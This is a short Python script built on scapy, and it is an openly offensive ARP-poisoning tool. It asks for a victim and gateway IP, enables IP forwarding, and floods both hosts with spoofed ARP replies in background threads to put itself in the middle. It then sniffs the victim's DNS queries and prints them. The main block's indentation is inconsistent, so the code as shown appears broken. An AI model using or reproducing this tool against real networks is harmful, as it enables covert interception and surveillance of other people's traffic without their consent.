from scapy.all import *
import threading
import os
import sys
import time

VIP = input('Victim IP: ')
GW = input('Gateway IP: ')
IFACE = input('Interface: ')

print("\t\t\nPoisoning Victim IP")
os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

def dnspkthandle(pkt):
        if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
                print('Victim: ' + VIP + ' : Requested DNS : ' + str(pkt.getlayer(DNS).qd.qname))

def victim_poison():
        vctm = ARP(pdst=VIP, psrc=GW)
        while True:
                try:
                        send(vctm, verbose=0, inter=1, loop=1)
                except KeyboardInterrupt:
                        sys.exit(1)

def gateway_poison():
        gw = ARP(pdst=GW, psrc=VIP)
        while True:
                try:
                        send(gw,verbose=0,inter=1,loop=1)
                except KeyboardInterrupt:
                        sys.exit(1)

vthread = []
gwthread = []


if __name__ == "__main__":
    vpoison = threading.Thread(target=victim_poison)
        vpoison.setDaemon(True)
        vthread.append(vpoison)
        vpoison.start()

        gwpoison = threading.Thread(target=gateway_poison)
        gwpoison.setDaemon(True)
        gwthread.append(gwpoison)
        gwpoison.start()

        pkt = sniff(iface=IFACE,filter='udp port 53',prn=dnspkthandle)

